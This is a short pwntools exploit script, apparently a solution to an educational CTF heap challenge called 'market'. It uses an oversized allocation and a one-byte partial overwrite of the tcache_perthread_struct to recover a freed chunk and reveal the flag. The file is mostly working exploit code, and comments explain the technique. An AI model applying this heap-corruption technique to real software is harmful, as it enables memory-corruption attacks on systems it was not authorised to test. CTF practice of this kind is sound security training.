#!/usr/bin/python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'amd64'

if args['R']:
    r = remote('edu-ctf.zoolab.org', 30209)
else:
    r = process('./market')

r.sendlineafter('the admin', b'n')
gdb.attach(r)
r.sendlineafter('your name', b'A') # not important
r.sendlineafter('How long', str(0x280)) # get tcache_perthread_struct
# the cnt recorded for 0x20~0x410 is 64 2-bytes => 16 8-bytes => 0x80 garbage
# \xb0 is partial overwrite the address in tcache 0x20
r.sendafter('your secret', b'A'*0x80 + b'\xb0')
r.sendlineafter('new secret', '4')
r.sendlineafter('How long', str(0x10)) # get the original 0x20 chunk with the secret
r.sendafter('your secret', b'A'*0x10)

r.sendlineafter('new secret', '2') # show FLAG

r.interactive()
